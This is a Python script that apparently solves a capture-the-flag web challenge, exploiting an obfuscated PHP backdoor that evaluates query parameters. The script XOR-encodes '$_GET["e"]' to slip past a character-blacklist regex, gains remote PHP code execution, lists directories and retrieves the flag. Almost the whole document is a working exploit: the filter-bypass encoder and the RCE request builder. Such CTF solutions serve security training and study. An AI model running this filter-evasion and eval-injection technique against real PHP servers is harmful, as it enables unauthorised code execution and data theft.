import requests
import urllib
import re

base_url = 'https://until-the-end.secchallenge.crysys.hu'


def solve():
    dirlist = scandir('.')
    hidden_folder = re.search('very.*', dirlist).group()
    subfolder = scandir(hidden_folder)
    assert 'flag' in subfolder
    return requests.get(f'{base_url}/{hidden_folder}/flag').text


def scandir(path):
    return rce(f'foreach (scandir("{path}") as $v) echo $v."\n";')


def rce(cmd):

    # The task is built around PHPFuck obfuscation. After we extract the mess, we get:

    # if (isset($_GET[' '])) {
    #   eval(str_replace('a', str_replace('kekw'), str_rot13(strtoupper(substr($_GET[' '], 42, 69)))));
    # }
    # else if (isset($_GET['+'])) {
    #   if (preg_match('/[b-d\-0-9H-LA-DU-Xi-kn-s!?TEz.]/', $_GET['+'])) die();
    #   eval($_GET['+']);
    # }
    # else {
    #   die();
    #   shell_exec($_GET['cmd']);
    # }

    # we will exploit the second 'if' case. Let's introduce a new query parameter 'e' which will be
    # executed by our exploit.
    #
    # First build up the string '$_GET["e"]' with XOR operations to trick the regexp filter.
    # $a equals to '$_GET["e"]'.
    # If we eval it, we get the 'e' query parameter, the second eval in turn runs e as PHP code:
    enc1, enc2 = encode('$_GET["e"]')
    # exploit = f'''
    #     $a='P#{y/t|@|<' ^ 't|<<{/^%^a';
    #     eval("eval($a);");
    # '''
    exploit = f'''
        $a='{enc1}'^'{enc2}';
        eval("eval($a);");
    '''

    exploit = urllib.parse.quote(exploit)

    cmd = 'echo "qqqqq";' + cmd + 'echo "qqqqq";'
    cmd = urllib.parse.quote(cmd)
    response = requests.get(f'{base_url}?e={cmd}&%2b={exploit}')
    return re.search(r'qqqqq(.*)qqqqq', response.text, re.DOTALL).group(1)

def encode(st):
    rx = r'[\'b-d\-0-9H-LA-DU-Xi-kn-s!?TEz.]'
    res1 = ''
    res2 = ''

    for ch in st:
        for i in range(32, 127):
            x = ord(ch) ^ i
            if 32 <= x < 127 and not re.match(rx, chr(x)) and not re.match(rx, chr(i)):
                res1 += chr(x)
                res2 += chr(i)
                break

    return res1, res2

if __name__ == "__main__":
    print(solve())
